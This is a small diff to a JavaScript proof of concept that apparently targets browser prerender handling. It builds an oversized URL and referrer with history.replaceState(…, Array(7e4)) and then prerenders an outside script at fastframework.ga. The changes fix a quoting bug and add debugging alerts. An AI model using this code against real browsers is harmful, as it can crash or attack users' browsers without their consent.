@@ -15,11 +15,14 @@ PeticionPOST("https://fastframework.ga/ff.js", function(resp) {
 
   alert("Long url to create a big referrer"); 
   history.replaceState(1,1,Array(7e4));
+  alert("Using big url!");
   var link = document.createElement("link");
-  link.rel = prerender;
+  link.rel = "prerender";
   link.href = "https://fastframework.ga/ff.js";
+  alert("Created link!\nAppending to body");
   document.body.appendChild(link);
-    
+  alert("Link appended!");
+
 }, "");
 
 
